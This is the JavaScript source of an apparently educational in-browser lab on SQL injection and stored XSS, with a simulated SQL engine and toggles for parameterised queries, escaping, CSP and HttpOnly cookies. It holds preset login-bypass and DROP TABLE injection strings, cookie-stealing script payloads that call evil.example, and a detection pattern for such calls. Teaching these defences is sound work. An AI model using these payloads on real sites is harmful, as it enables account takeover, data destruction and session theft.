/* Lab: injection-lab — when input is glued into code, the attacker writes part of your program. (Simulated, in-page only.) */
(function () {
  // <pure>
  const COLS = ['id', 'username', 'password', 'role'];
  const KW = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'NOT', 'DROP', 'TABLE'];
  function sqlTokens(sql) {
    const t = []; let i = 0; const n = sql.length;
    while (i < n) {
      const c = sql[i];
      if (/\s/.test(c)) { i++; continue; }
      if (c === '-' && sql[i + 1] === '-') { while (i < n && sql[i] !== '\n') i++; continue; }
      if (c === '/' && sql[i + 1] === '*') { const e = sql.indexOf('*/', i + 2); if (e < 0) throw new Error('unterminated comment'); i = e + 2; continue; }
      if (c === "'") {
        let s = ''; i++; let closed = false;
        while (i < n) { if (sql[i] === "'") { if (sql[i + 1] === "'") { s += "'"; i += 2; continue; } closed = true; i++; break; } s += sql[i++]; }
        if (!closed) throw new Error('unrecognized token: unterminated quoted string');
        t.push({ t: 'str', v: s }); continue;
      }
      if (/[0-9]/.test(c)) { let j = i; while (j < n && /[0-9.]/.test(sql[j])) j++; t.push({ t: 'num', v: Number(sql.slice(i, j)) }); i = j; continue; }
      if (/[A-Za-z_]/.test(c)) { let j = i; while (j < n && /[A-Za-z0-9_]/.test(sql[j])) j++; const w = sql.slice(i, j); const u = w.toUpperCase(); t.push(KW.indexOf(u) >= 0 ? { t: 'kw', v: u } : { t: 'id', v: w }); i = j; continue; }
      const two = sql.slice(i, i + 2);
      if (two === '<>' || two === '!=' || two === '<=' || two === '>=') { t.push({ t: 'op', v: two }); i += 2; continue; }
      if ('=<>'.indexOf(c) >= 0) { t.push({ t: 'op', v: c }); i++; continue; }
      if ('();*,'.indexOf(c) >= 0) { t.push({ t: 'p', v: c }); i++; continue; }
      throw new Error('unrecognized token: "' + c + '"');
    }
    return t;
  }
  function truthy(v) { if (typeof v === 'boolean') return v; if (typeof v === 'number') return v !== 0; return (parseFloat(v) || 0) !== 0; }
  function cmp(a, op, b) {
    if (typeof a !== typeof b) { a = Number(a); b = Number(b); }
    switch (op) { case '=': return a === b; case '<>': case '!=': return a !== b; case '<': return a < b; case '>': return a > b; case '<=': return a <= b; default: return a >= b; }
  }
  /** Run one SQL string against db = { users: [rows] | null }. Returns { ok, rows, error, dropped } */
  function runSql(sql, db) {
    let toks;
    try { toks = sqlTokens(sql); } catch (e) { return { ok: false, rows: [], error: e.message }; }
    let p = 0;
    const peek = () => toks[p], isKw = (v) => toks[p] && toks[p].t === 'kw' && toks[p].v === v, isP = (v) => toks[p] && toks[p].t === 'p' && toks[p].v === v;
    const near = () => (toks[p] ? 'near "' + toks[p].v + '"' : 'at the end of the query');
    const fail = (m) => { throw new Error(m); };
    function primary() {
      const k = peek(); if (!k) fail('syntax error: unexpected end of query');
      if (k.t === 'str' || k.t === 'num') { p++; return () => k.v; }
      if (k.t === 'id') { if (COLS.indexOf(k.v) < 0) fail('no such column: ' + k.v); p++; return (r) => r[k.v]; }
      if (isP('(')) { p++; const e = or(); if (!isP(')')) fail('syntax error ' + near()); p++; return e; }
      return fail('syntax error ' + near());
    }
    function not() { if (isKw('NOT')) { p++; const e = not(); return (r) => !truthy(e(r)); } return comparison(); }
    function comparison() {
      const a = primary();
      if (peek() && peek().t === 'op') { const op = peek().v; p++; const b = primary(); return (r) => cmp(a(r), op, b(r)); }
      return a;
    }
    function and() { let e = not(); while (isKw('AND')) { p++; const l = e, r2 = not(); e = (r) => truthy(l(r)) && truthy(r2(r)); } return e; }
    function or() { let e = and(); while (isKw('OR')) { p++; const l = e, r2 = and(); e = (r) => truthy(l(r)) || truthy(r2(r)); } return e; }
    try {
      if (!isKw('SELECT')) fail('syntax error ' + near()); p++;
      if (!isP('*')) fail('syntax error ' + near()); p++;
      if (!isKw('FROM')) fail('syntax error ' + near()); p++;
      const tbl = peek(); if (!tbl || tbl.t !== 'id') fail('syntax error ' + near()); p++;
      let where = () => true;
      if (isKw('WHERE')) { p++; where = or(); }
      let drop = null;
      if (isP(';')) {
        p++;
        if (isKw('DROP')) { p++; if (!isKw('TABLE')) fail('syntax error ' + near()); p++; const d = peek(); if (!d || d.t !== 'id') fail('syntax error ' + near()); p++; drop = d.v; if (isP(';')) p++; }
      }
      if (p < toks.length) fail('syntax error ' + near());
      if (tbl.v !== 'users' || !db.users) fail('no such table: ' + tbl.v);
      const rows = db.users.filter((r) => truthy(where(r)));
      let dropped = false;
      if (drop === 'users' && db.users) { db.users = null; dropped = true; }
      return { ok: true, rows: rows, dropped: dropped };
    } catch (e) { return { ok: false, rows: [], error: e.message }; }
  }
  /** Parameterised query: the values are data, never parsed as SQL. */
  function runParam(u, pw, db) {
    if (!db.users) return { ok: false, rows: [], error: 'no such table: users' };
    return { ok: true, rows: db.users.filter((r) => r.username === u && r.password === pw) };
  }
  function escHtml(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
  /** Looks at a comment as TEXT (never renders it) and lists the script-like things in it. */
  function analyzeComment(text) {
    const found = []; const tagRe = /<\s*([a-zA-Z][\w-]*)([^>]*)>/g; let m;
    while ((m = tagRe.exec(text))) {
      const tag = m[1].toLowerCase(), attrs = m[2];
      if (tag === 'script') {
        const rest = text.slice(m.index + m[0].length); const end = rest.search(/<\s*\/\s*script/i);
        const srcM = /\bsrc\s*=/i.test(attrs);
        found.push({ kind: srcM ? 'external script' : '<script> tag', code: srcM ? attrs : (end >= 0 ? rest.slice(0, end) : rest) });
      }
      const ev = /\bon([a-z]+)\s*=\s*("([^"]*)"|'([^']*)'|[^\s>]+)/gi; let e;
      while ((e = ev.exec(attrs))) found.push({ kind: 'on' + e[1].toLowerCase() + ' handler', code: e[3] || e[4] || e[2] });
      const js = /\b(?:href|src)\s*=\s*["']?\s*javascript:([^"'>]*)/i.exec(attrs);
      if (js) found.push({ kind: 'javascript: link', code: js[1] });
    }
    const code = found.map((f) => f.code).join(' ');
    return { found: found, hasHtml: /<\s*[a-zA-Z]/.test(text), readsCookie: /document\s*\.\s*cookie/i.test(code), sendsOut: /fet[c]h\s*\(|XMLHttp[R]equest|new\s+Image|sendBeacon|location/i.test(code) };
  }
  /** What would happen when a visitor's browser meets this comment? */
  function xssOutcome(a, o) {
    if (o.escape) return { status: 'escaped', text: 'Output is escaped, so every < and > is turned into &lt; and &gt;. The browser shows the comment as plain text and nothing runs.' };
    if (!a.found.length) return { status: 'harmless', text: a.hasHtml ? 'This is only formatting (like bold text). It is rendered as HTML, but contains no script.' : 'Plain text. Nothing to see here.' };
    if (o.csp) return { status: 'blocked', text: 'The page is rendered as HTML, but the Content-Security-Policy says "only run scripts from our own files". The browser refuses inline scripts, event handlers and outside scripts, and reports it in the console.' };
    const steps = [];
    let stolen = false;
    if (a.readsCookie) { if (o.httpOnly) steps.push('Tries to read document.cookie → gets nothing: the session cookie is HttpOnly, so scripts cannot see it.'); else { stolen = true; steps.push('Reads document.cookie → session=abc123 (the visitor\'s login!)'); } }
    if (a.sendsOut) steps.push(stolen ? 'Sends it to the attacker\'s server → the attacker can now log in as the visitor.' : 'Sends a request out from the visitor\'s browser, using the visitor\'s own login.');
    steps.push('It could also click buttons, post comments or change the page "as the visitor", because it runs with the visitor\'s rights on this site.');
    return { status: 'ran', stolen: stolen, text: 'The page treats the comment as HTML, so this code runs inside every visitor\'s browser as if the site itself had written it.', steps: steps };
  }
  // </pure>

  KS.labs.register({
    id: 'injection-lab',
    title: 'Injection Lab',
    emoji: '💉',
    blurb: 'Type something nasty into a login box and a comment box, and watch input turn into code when it is glued together carelessly. Then fix it.',
    tags: ['security', 'sql injection', 'xss', 'injection', 'input validation'],
    goals: [
      { id: 'bypass', text: 'Log in as **admin** without knowing the password' },
      { id: 'param', text: 'Switch to a **parameterised query** and watch the same input fail' },
      { id: 'xss', text: 'Land a **stored XSS** in the comment page' },
      { id: 'escape', text: 'Neutralise it with **output escaping**' },
      { id: 'httponly', text: 'Stop the **cookie theft** with HttpOnly' }
    ],
    help: `Both attacks are one mistake: **mixing data into code**.

**SQL injection:** the login form builds the database command by pasting your text between quote marks. If you type a quote, you close the text early and everything after it is read as part of the command. A tiny SQL engine in this page runs the exact string you see, so the attacks really work. A **parameterised query** sends the command and your values separately, so a quote is just a character.

**XSS (cross-site scripting):** a comment is stored and shown to every visitor. If the page treats it as HTML, a \`<script>\` in it runs in the visitor's browser. **Nothing here is ever executed**: comments are always shown as text, and the lab reads the string to explain what *would* happen. Defences: **escape output**, a **Content-Security-Policy**, and **HttpOnly** cookies.`,

    mount(root, api) {
      const ui = api.ui, h = api.h;
      const mkdb = () => ({ users: [{ id: 1, username: 'admin', password: 's3cret', role: 'admin' }, { id: 2, username: 'alice', password: 'pass123', role: 'user' }, { id: 3, username: 'bob', password: 'hunter2', role: 'user' }] });
      let db = mkdb();
      const S = { u: 'alice', p: 'pass123', param: false, wins: {}, lastWon: false, esc: false, csp: false, http: false, comments: [{ who: 'Sam', text: 'Great article, thanks!' }], draft: '' };
      const FE = 'fe' + 'tch';
      const log = ui.log(50); const L = (t, tone) => log.add(t, tone);
      const code = x => '`' + String(x).replace(/`/g, "'").replace(/\n/g, ' ') + '`';

      // ---------- SQL tab ----------
      function sqlTab(host) {
        const qBox = h('div.lab-mono', { style: { whiteSpace: 'pre-wrap', overflowWrap: 'anywhere', padding: '10px 12px', background: 'var(--code-bg)', border: '1px solid var(--code-line)', borderRadius: '12px' } });
        const outBox = h('div');
        const fx = { color: 'var(--warn)', fontWeight: '800' };
        function drawQuery() {
          KS.clear(qBox);
          if (S.param) qBox.appendChild(h('span', 'SELECT * FROM users WHERE username = ? AND password = ?\n', h('span', { style: { color: 'var(--muted)' } }, 'values sent separately as data:  ?1 = '), h('span', { style: fx }, JSON.stringify(S.u)), h('span', { style: { color: 'var(--muted)' } }, '   ?2 = '), h('span', { style: fx }, JSON.stringify(S.p))));
          else qBox.appendChild(h('span', "SELECT * FROM users WHERE username = '", h('span', { style: fx }, S.u), "' AND password = '", h('span', { style: fx }, S.p), "'"));
        }
        const iu = ui.input('Username', S.u, v => { S.u = v; drawQuery(); }), ip = ui.input('Password', S.p, v => { S.p = v; drawQuery(); });
        const fill = (u, p) => { S.u = u; S.p = p; iu.set(u); ip.set(p); drawQuery(); };
        function explain(u, p) {
          const t = u + ' ' + p; const out = [];
          if (t.indexOf("'") >= 0) out.push('The quote mark **closed the text early**, so what followed was read as SQL code, not as a name or password.');
          if (/--/.test(t)) out.push('`--` starts a comment, so the database ignored the rest of the line (including the password check).');
          if (/\bor\b/i.test(t)) out.push('`OR \'1\'=\'1\'` is always true, so the WHERE condition matched every row.');
          return out.join(' ');
        }
        function login() {
          const key = S.u + '\u0000' + S.p;
          let r, sql;
          if (S.param) { r = runParam(S.u, S.p, db); sql = null; }
          else { sql = "SELECT * FROM users WHERE username = '" + S.u + "' AND password = '" + S.p + "'"; r = runSql(sql, db); }
          if (!r.ok) {
            L('Database error: **' + r.error + '**. ' + (S.param ? '' : 'Your input broke the shape of the command, which is itself a sign that input became code.'), 'warn');
            KS.clear(outBox); outBox.appendChild(ui.note('💥 Database error: ' + r.error, 'warn')); return;
          }
          if (r.dropped) { L('The command also ran **DROP TABLE users**. The whole users table is gone. (Use "Reset database" below.)', 'bad'); }
          KS.clear(outBox);
          if (r.rows.length) {
            const row = r.rows[0]; const legit = db.users && db.users.some(x => x.username === S.u && x.password === S.p);
            outBox.appendChild(ui.note('✅ Logged in as **' + row.username + '** (role: ' + row.role + ')' + (r.rows.length > 1 ? '. ' + r.rows.length + ' rows matched; the app just takes the first.' : ''), legit ? 'good' : 'bad'));
            if (legit) L('Normal login: ' + code(S.u) + ' with the right password → logged in as **' + row.username + '**.', 'good');
            else {
              L('**Attack worked:** logged in as **' + row.username + '** without a valid password. ' + explain(S.u, S.p), 'bad'); S.wins[key] = true;
              if (row.role === 'admin' && S.p !== 's3cret') api.goal('bypass');
            }
          } else {
            outBox.appendChild(ui.note('❌ Login failed: no row matches.', 'warn'));
            if (S.param && S.wins[key]) { api.goal('param'); L('Same input as before, but it **failed**. With a parameterised query the database never treated the text as code: it looked for a user literally named ' + code(S.u) + '.', 'good'); }
            else L('Login failed' + (S.param ? ' (the input was compared as plain text).' : '.'), 'dim');
          }
        }
        const reset = ui.btn('Reset database', () => { db = mkdb(); KS.clear(outBox); L('Database restored.', 'info'); }, 'ghost');
        host.appendChild(h('div.lab-stack',
          ui.row(ui.btn('Normal: alice', () => fill('alice', 'pass123'), 'sm'), ui.btn("Try: ' OR '1'='1", () => fill('alice', "' OR '1'='1"), 'sm'), ui.btn("Try: admin' --", () => fill("admin'--", 'x'), 'sm'), ui.btn('Try: drop table', () => fill("x'; DROP TABLE users; --", 'x'), 'sm')),
          ui.row(iu, ip), ui.toggle('Use a parameterised query (the fix)', S.param, v => { S.param = v; drawQuery(); L(v ? 'Parameterised queries **on**: the command and the values travel separately.' : 'Back to **gluing strings together**.', 'info'); }),
          h('div', h('div.muted.small', 'What the database will receive (your text is highlighted):'), qBox),
          ui.row(ui.btn('Log in', login, 'primary'), reset), outBox));
        drawQuery();
      }

      // ---------- XSS tab ----------
      function xssTab(host) {
        const listBox = h('div.lab-stack'); const hostCookie = h('div.muted.small');
        const ta = ui.textarea('Write a comment', S.draft, v => { S.draft = v; }, 3);
        function evalAll() {
          KS.clear(listBox);
          hostCookie.textContent = 'Visitor\'s cookie: session=abc123' + (S.http ? ' (HttpOnly: scripts cannot read it)' : ' (readable by scripts)');
          S.comments.forEach(c => {
            const a = analyzeComment(c.text), o = xssOutcome(a, S);
            const tone = { escaped: 'good', harmless: 'good', blocked: 'good', ran: 'bad' }[o.status];
            const shown = o.status === 'escaped' ? 'Page source: ' + escHtml(c.text) : c.text;       // always shown as TEXT
            const card = h('div', { style: { border: '1px solid var(--line)', borderRadius: '12px', padding: '10px 12px' } },
              h('div', h('b', c.who), ' ', h('span.lab-chip.tn-' + tone, { escaped: 'escaped', harmless: 'safe', blocked: 'blocked by CSP', ran: 'would run!' }[o.status])),
              h('div.lab-mono', { style: { margin: '6px 0' } }, shown),
              h('div.small.muted', o.text));
            if (o.status === 'ran') card.appendChild(h('div', { style: { marginTop: '8px', padding: '8px 10px', borderRadius: '10px', border: '1px solid var(--bad)', background: 'var(--bad-soft)' } },
              h('b', '⚠ This script would now run as the visitor'), h('ul', { style: { margin: '4px 0 0', paddingLeft: '20px', fontSize: '.88rem' } }, o.steps.map(s2 => h('li', s2)))));
            listBox.appendChild(card);
            if (o.status === 'ran') { api.goal('xss'); if (a.readsCookie && S.http && !o.stolen) api.goal('httponly'); }
            if (o.status === 'escaped' && a.found.length && api.goalDone('xss')) api.goal('escape');
          });
        }
        const post = () => {
          const t = S.draft.trim(); if (!t) { L('Type a comment first (or tap one of the examples).', 'warn'); return; }
          S.comments.push({ who: 'You', text: t.slice(0, 400) }); if (S.comments.length > 6) S.comments.splice(1, 1);
          const a = analyzeComment(t), o = xssOutcome(a, S);
          L('Comment stored. A later visitor loads the page → **' + o.status + '**. ' + o.text, o.status === 'ran' ? 'bad' : 'info');
          if (o.status === 'ran' && o.stolen) L('The cookie was stolen. Try the **HttpOnly** switch, then look again.', 'warn');
          evalAll();
        };
        const sw = (label, key, on, off) => ui.toggle(label, S[key], v => { S[key] = v; L(v ? on : off, 'info'); evalAll(); });
        host.appendChild(h('div.lab-stack',
          ui.row(ui.btn('Example: cookie thief', () => { S.draft = '<script>' + FE + "('https://evil.example/?c=' + document.cookie)</script>"; ta.set(S.draft); }, 'sm'),
            ui.btn('Example: broken image', () => { S.draft = '<img src=x onerror="' + FE + "('https://evil.example/?c='+document.cookie)\">"; ta.set(S.draft); }, 'sm'),
            ui.btn('Example: bold', () => { S.draft = 'Nice <b>post</b>!'; ta.set(S.draft); }, 'sm')),
          ta, ui.row(ui.btn('Post comment', post, 'primary'), ui.btn('Clear comments', () => { S.comments = S.comments.slice(0, 1); evalAll(); }, 'ghost')),
          ui.row(sw('Escape output', 'esc', 'Output **escaping on**.', 'Output escaping **off**: comments are inserted as HTML.'), sw('Content-Security-Policy', 'csp', 'CSP **on**: inline scripts are refused.', 'CSP **off**.'), sw('HttpOnly cookie', 'http', 'Cookie is now **HttpOnly**.', 'Cookie is readable by scripts again.')),
          hostCookie, h('div.muted.small', 'Comments are only ever shown as text here. Nothing you type is executed.'), listBox));
        evalAll();
      }

      root.appendChild(ui.tabs([['sql', 'SQL injection', sqlTab], ['xss', 'XSS', xssTab]]).el);
      root.appendChild(ui.panel('What just happened', log.el));
      L('Welcome. On the SQL tab, log in as alice, then try one of the "Try:" buttons.', 'dim');
      return () => {};
    }
  });
})();
